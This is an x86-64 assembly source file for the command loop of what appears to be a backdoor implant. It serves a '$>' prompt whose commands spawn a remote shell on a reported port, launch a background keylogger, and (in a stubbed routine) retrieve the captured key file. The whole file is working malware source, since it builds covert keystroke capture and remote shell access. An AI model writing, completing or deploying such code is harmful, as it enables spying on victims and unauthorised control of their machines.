BITS 64

%define BUFF_SIZE 0x20

section .text
    global shell_mode
    extern strcmp
    extern launch_remote
    extern keylogger
    ; extern getkeys
    global shell_port

putnbr_fd:
    push    rbp
    mov     rbp, rsp
    mov     eax, edi
    xor     edx, edx
    mov     cx, 10
    idiv    cx
    push    rdx
    push    rsi
    cmp     al, 0
    je      disp
    mov     edi, eax
    call    putnbr_fd
disp:
    pop     rdi
    pop     rax
    add     eax, 48
    push    rax
    lea     rsi, [rsp]
    xor     edx, edx
    xor     eax, eax
    inc     edx
    inc     eax ; write
    syscall
    leave
    ret

cmdhelp:
    xor     edx, edx
    xor     eax, eax
    lea     rsi, [rel help]
    add     edx, help.len
    inc     eax ; write
    syscall
    ret

cmdkeylog:
    push    rbp
    mov     rbp, rsp
    push    rdi
     xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     retkeylog
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, 0x03 ; close
    syscall
    call    keylogger
retkeylog:
    xor     edi, edi ; P_ALL
    xor     esi, esi
    xor     edx, edx
    xor     r10, r10
    xor     r8, r8
    xor     eax, eax
    mov     eax, 0x3d ; waitid
    syscall
    mov     edi, [rsp]
    xor     edx, edx
    xor     eax, eax
    lea     rsi, [rel keylog]
    add     edx, keylog.len
    inc     eax ; write
    syscall
    leave
    ret

cmdgetkeys:
    ; call getkeys
    ret


cmdunknown:
    xor     edx, edx
    xor     eax, eax
    lea     rsi, [rel unknown]
    add     edx, unknown.len
    inc     eax ; write
    syscall
    ret

cmdshell:
    push    rbp
    mov     rbp, rsp
    push    rdi
    xor     edi, edi
    xor     esi, esi
    xor     edx, edx
    xor     r10, r10
    xor     r8, r8
    xor     r9, r9
    xor     eax, eax
    add     esi, 16
    add     edx, 3 ; PROT_READ | PROT_WRITE
    add     r10, 33 ; MAP_ANONYMOUS | MAP_SHARED
    dec     r8
    add     eax, 0x09 ; mmap
    syscall
    mov     [shell_port], rax
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     retshell
    mov     rdi, [rsp]
    xor     eax, eax
    add     eax, 0x03 ; close
    syscall
    call    launch_remote
retshell:
    xor     edi, edi ; P_ALL
    xor     esi, esi
    xor     edx, edx
    xor     r10, r10
    xor     r8, r8
    xor     eax, eax
    mov     eax, 0x3d ; waitid
    syscall
    mov     edi, [rsp]
    lea     rsi, [rel shell]
    xor     edx, edx
    add     edx, shell.len
    xor     eax, eax
    inc     eax ; write
    syscall
    mov     rax, [shell_port]
    xor     rdi, rdi
    add     di, WORD [rax + 2]
    bswap   edi
    shr     edi, 16
    mov     rsi, [rsp]
    call    putnbr_fd
    mov     edi, [rsp]
    push    10
    lea     rsi, [rsp]
    xor     eax, eax
    inc     eax ; write
    syscall
    lea     rdi, [shell_port]
    xor     esi, esi
    add     esi, 16
    xor     eax, eax
    add     eax, 0xb ; munmap
    syscall
    leave
    ret

prompt:
    xor     edx, edx
    xor     eax, eax
    lea     rsi, [rel promptstr]
    add     edx, promptstr.len
    inc     eax ; write
    syscall
    ret

get_cmd:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    mov     QWORD [rsp], rdi
    lea     r8, [rel cmds]
loop_cmp:
    mov     QWORD rdi, [r8]
    mov     QWORD rsi, [rsp]
    call    strcmp
    cmp     eax, 0
    je      cmdret
    add     r8, 0x10
    cmp     QWORD [r8], 0
    jne     loop_cmp
cmdret:
    mov     rax, [r8 + 8]
    leave
    ret

shell_mode:
    push    rbp
    mov     rbp, rsp
    sub     rsp, BUFF_SIZE + 0x10
    mov     DWORD [rsp], edi
shell_loop:
    mov     edi, [rsp]
    call    prompt
    mov     edi, [rsp]
    lea     rsi, [rbp - BUFF_SIZE]
    xor     edx, edx
    add     edx, BUFF_SIZE - 1
    xor     eax, eax ; read
    syscall
    mov     BYTE [rbp - BUFF_SIZE + rax], 0x0
    lea     rdi, [rbp - BUFF_SIZE]
    call    get_cmd
    mov     edi, [rsp]
    cmp     eax, -1
    je      quit
    call    rax
    jmp     shell_loop
quit:
    leave
    ret
   
    shell_port: dq 0

    promptstr: db "$> ", 0
        .len: equ $ - promptstr
    strexit: db "exit", 10, 0
        .len: equ $ - strexit
    strhelp: db "?", 10, 0
        .len: equ $ - strhelp
    strshell: db "shell", 10, 0
        .len: equ $ - strshell
    strkeylog: db "keylog", 10, 0
        .len: equ $ - strkeylog
    strgetkeys: db "getkeys", 10, 0
        .len: equ $ - strgetkeys
    keylog: db "Keylogger has been launched in background, you can use the getkeys command to retrieve the keyfile", 10, 0
        .len: equ $ - keylog
    help: db "?: display help", 10, "shell: spawn a shell.", 10, "keylog: launch a keylogger", 10, "getkeys: get the key file of the keylogger", 10, "exit: quit", 10
        .len: equ $ - help
    unknown: db "Unknown command: Please type ? for help", 10
        .len: equ $ - unknown
    shell: db "A shell has been spawn on port : ", 0
        .len: equ $ - shell
    cmds: dq strexit, -1, strshell, cmdshell, strhelp, cmdhelp, strkeylog, cmdkeylog, strgetkeys, cmdgetkeys, 0, cmdunknown
